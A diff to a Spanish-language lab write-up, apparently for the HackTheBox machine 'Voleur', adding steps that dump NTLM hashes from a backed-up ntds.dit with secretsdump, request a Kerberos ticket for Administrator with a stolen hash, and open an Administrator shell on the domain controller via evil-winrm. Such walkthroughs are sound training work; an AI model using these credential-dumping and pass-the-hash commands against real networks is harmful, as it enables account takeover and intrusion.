@@ -268,5 +268,24 @@ Vemos una carpeta llamada  Backups:
 
 ![[Pasted image 20251025165725.png]]
 
-teniendo acceso a estos dos archivos podemos extraer las credenciales usando impacket-secretsdump:
+teniendo acceso a estos dos archivos, podemos extraer las credenciales usando impacket-secretsdump:
 
+```python
+secretsdump.py -ntds ./ntds.dit -system ./SYSTEM LOCAL
+```
+
+
+Esto nos va a devolver el hash NTLM del suuario administrador, usando ese hash, podemos solicitar un TGT, el cual nos permite autenticarnos con winrm contra el DC:
+
+```python
+impacket-getTGT 'VOLEUR.HTB/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2  
+  
+export KRB5CCNAME=Administrator.ccache  
+klist  
+  
+# authenticate to WinRM via Kerberos to get an Administrator shell  
+evil-winrm -i dc.voleur.htb -r voleur.htb -k -u Administrator
+```
+
+
+Y de esta forma obtenemos acceos a la maquina.
